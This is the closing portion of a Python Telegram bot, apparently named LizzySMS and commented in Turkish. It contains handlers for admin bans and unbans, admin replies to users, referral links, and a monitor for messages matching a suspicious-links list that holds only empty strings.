        user_state[uid] = {"step": "awaiting_reply", "target": target_uid}
    else:
        target_uid = int(c.data.replace("ban_from_report__", ""))
        banned_users.add(target_uid)
        bot.send_message(c.message.chat.id, f"🔒 {target_uid} banlandı.")
        try:
            bot.send_message(target_uid, "❌ Bot erişiminiz engellendi (admin kararı).")
        except:
            pass

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id].get("step") == "awaiting_reply")
def handle_reply(m):
    uid = m.from_user.id
    state = user_state[uid]
    target_uid = state["target"]
    text = m.text.strip()
    try:
        bot.send_message(target_uid, f"💬 Admin’den mesaj: {text}")
        bot.reply_to(m, "✅ Mesaj kullanıcıya iletildi.")
    except Exception as e:
        bot.reply_to(m, "❌ Mesaj gönderilemedi. Kullanıcıya ulaşım yok.")
    user_state.pop(uid, None)

# ---------------- ADMIN BAN / UNBAN via inline (kullanıcıdan ID alma) ----------------
@bot.callback_query_handler(func=lambda c: c.data in ["ban_user", "unban_user"])
def cb_ban_user_request(c):
    uid = c.from_user.id
    if uid not in admin_sessions:
        bot.answer_callback_query(c.id, "❌ Admin yetkisi yok.")
        return
    bot.answer_callback_query(c.id)
    action = c.data
    bot.send_message(c.message.chat.id, "📌 Kullanıcı ID girin:")
    user_state[uid] = {"step": "awaiting_ban_user", "action": action}

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id].get("step") == "awaiting_ban_user")
def handle_ban_user(m):
    admin_uid = m.from_user.id
    state = user_state[admin_uid]
    try:
        target_uid = int(m.text.strip())
    except:
        bot.reply_to(m, "❌ ID geçersiz.")
        return
    if state["action"] == "ban_user":
        banned_users.add(target_uid)
        bot.reply_to(m, f"🔒 {target_uid} yasaklandı.")
        try:
            bot.send_message(target_uid, "❌ Bot erişiminiz engellendi.")
        except:
            pass
    else:
        if target_uid in banned_users:
            banned_users.remove(target_uid)
        bot.reply_to(m, f"✅ {target_uid} açıldı.")
        try:
            bot.send_message(target_uid, "✅ Bot erişiminiz açıldı.")
        except:
            pass
    user_state.pop(admin_uid, None)

# ---------------- REFERANS LINKİ GÖSTERİMİ ----------------
@bot.callback_query_handler(func=lambda c: c.data == "ref_link")
def cb_ref_link(c):
    uid = c.from_user.id
    if uid in banned_users:
        bot.answer_callback_query(c.id, "❌ Erişiminiz engellendi.")
        return
    ensure_user_data(uid)
    bot.answer_callback_query(c.id)
    # Bot kullanıcı adını değiştirmeyi unutma; burada YourBotUsername yerine bot username koy
    bot_username = bot.get_me().username or "LixzySmsBot"
    ref_link = f"https://t.me/{bot_username}?start={uid}"
    ref_count = users_data.get(str(uid), {}).get("ref_count", 0)
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(telebot.types.InlineKeyboardButton("Kopyala (Mobil)", callback_data="noop"))
    bot.send_message(uid, f"🔗 Sizin referans linkiniz: {ref_link}\n🎯 Toplam referans sayınız: {ref_count}\n\nNot: Başkalarının botlara/panel hizmetlerine ait sahte startlar vermesine izin vermeyin. Eğer botumuzda sahte/panel start tespit edilirse kalıcı ban uygulanabilir.", reply_markup=kb)

# noop handler (örnek) — butona tıklandığında sadece cevap verir
@bot.callback_query_handler(func=lambda c: c.data == "noop")
def cb_noop(c):
    bot.answer_callback_query(c.id, "🔔 Linki paylaşmak için kopyalayın.")

# ---------------- GLOBAL MESSAGE FILTER FOR SUSPICIOUS LINKS in messages (optional extra) ----------------
SUSPICIOUS_LINKS = ["", "", "", "", "", "", "", "", ""]
AUTO_BAN_ON_SUSPICIOUS_MESSAGE = False  # eğer true ise kullanıcı mesajında link/keyword görürse otomatik banlar

@bot.message_handler(func=lambda m: True)
def global_message_monitor(m):
    # Bu handler tüm mesajları dinler ama minimal müdahale eder.
    # Eğer mesaj text içiyorsa ve şüpheli anahtar kelime varsa (ve AUTO_BAN açık ise) ban uygular.
    try:
        if m.from_user.id in banned_users:
            # yasaklı ise herhangi bir işlem yapıp sonlandır
            return
        text = (m.text or "").lower()
        if not text:
            return
        for kw in SUSPICIOUS_LINKS:
            if kw in text:
                # admin uyar
                for aid in list(admin_sessions):
                    try:
                        bot.send_message(aid, f"⚠️ Şüpheli içerik tespit edildi. Kullanıcı: {m.from_user.id}\nMesaj: {m.text}")
                    except:
                        pass
                if AUTO_BAN_ON_SUSPICIOUS_MESSAGE:
                    banned_users.add(m.from_user.id)
                    try:
                        bot.send_message(m.chat.id, "❌ Şüpheli içerik tespit edildi. Erişiminiz engellendi.")
                    except:
                        pass
                # bildirimi yaptıktan sonra çık
                return
    except Exception:
        return

# ----------------- SON: Başlat ----------------
if __name__ == "__main__":
    print("🚀 LizzySMS Telebot (FULL) çalışıyor...")
    bot.infinity_polling()
    
